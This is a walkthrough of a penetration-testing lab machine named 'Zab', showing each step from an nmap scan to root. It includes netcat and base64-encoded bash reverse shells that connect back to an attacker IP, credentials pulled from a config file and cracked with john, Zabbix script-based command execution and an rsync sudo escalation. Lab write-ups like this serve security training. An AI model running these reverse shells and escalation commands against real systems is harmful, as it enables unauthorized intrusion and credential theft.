---
icon: ubuntu
---

# Zab - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.210 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 18:13 EDT
Nmap scan report for 192.168.231.210
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:5b:cb:6b:21:8c:fc:df:7b:c7:f7:f0:46:2e:6d:55 (ECDSA)
|_  256 ab:1a:ce:a7:f0:b6:0f:79:0b:54:b8:00:26:3d:69:58 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
6789/tcp open  http    Tornado httpd 6.3.3
|_http-server-header: TornadoServer/6.3.3
|_http-title: Mage
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   34.36 ms 192.168.45.1
2   34.28 ms 192.168.45.254
3   34.38 ms 192.168.251.1
4   34.50 ms 192.168.231.210
```

### <mark style="color:$primary;">HTTP Port 6789 TCP</mark>

<figure><img src="../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

We have webshell access from the start! I'll get a reverse shell instead

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

zabbix has 2 processes running used to start the Zabbix Agent and Server

<figure><img src="../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

I found 2 intersting ports running on localhost&#x20;

<figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

Zabbix app is normally accessible on port tcp 80, hosted on an Apache server.

**`/zabbix`** endpoint is mapped to the directory **`/usr/share/zabbix/ui`**. This allows access to the Zabbix user interface via the URL [http://127.0.0.1/zabbix](http://127.0.0.1/zabbix).

<figure><img src="../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

The [Zabbix documentation on maintenance mode](https://www.zabbix.com/documentation/1.8/en/manual/maintenance_mode_for_gui/configuration), confirmed that access to the Zabbix web application was restricted to local connections only.

<figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Port Forwarding Port 80</mark>

```
./chisel_1.10.1_linux_amd64 server -p 6789 --reverse
```

<figure><img src="../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

```
./chisel_1.10.1_linux_amd64 client 192.168.45.158:6789 R:8000:localhost:80
```

<figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

Zabbix configuration file contained the MySQL credentials, which allowed us to successfully connect to the Zabbix database.

<figure><img src="../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

```
zabbix:breadandbuttereater121
```

### <mark style="color:$primary;">Enumerating MySQL Database</mark>

```
mysql -h 127.0.0.1 -u zabbix -pbreadandbuttereater121
```

<figure><img src="../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

```
john database-hashes -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

John managed to crack the admin users hash

```
Admin:dinosaur
```

With this we were able to login to Zabbix UI as the administrator

<figure><img src="../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

I came across this write up that leads to RCE -> [**LINK**](https://medium.com/@ducanhbui/n1ctf-2020-zabbix-fun-writeup-6f5b9ec24f64)

navigate to Alerts -> Scripts -> Create Script, and configure a simple reverse shell to connect back to our server.

Will use a base64 encoded reverse shell

```
echo 'bash -i >& /dev/tcp/192.168.45.158/443 0>&1' | base64
```

<figure><img src="../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1OC80NDMgMD4mMQo= | base64 -d | /bin/bash
```

<figure><img src="../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>

Monitoring -> Hosts, click on our script, and successfully obtained a shell with the Zabbix user privileges

<figure><img src="../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>

[**GTFObins**](https://gtfobins.github.io/gtfobins/rsync/#sudo) contains an easy privesc

<figure><img src="../../.gitbook/assets/image (2508).png" alt=""><figcaption></figcaption></figure>

```
sudo /usr/bin/rsync -e 'bash -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

<figure><img src="../../.gitbook/assets/image (2509).png" alt=""><figcaption></figcaption></figure>
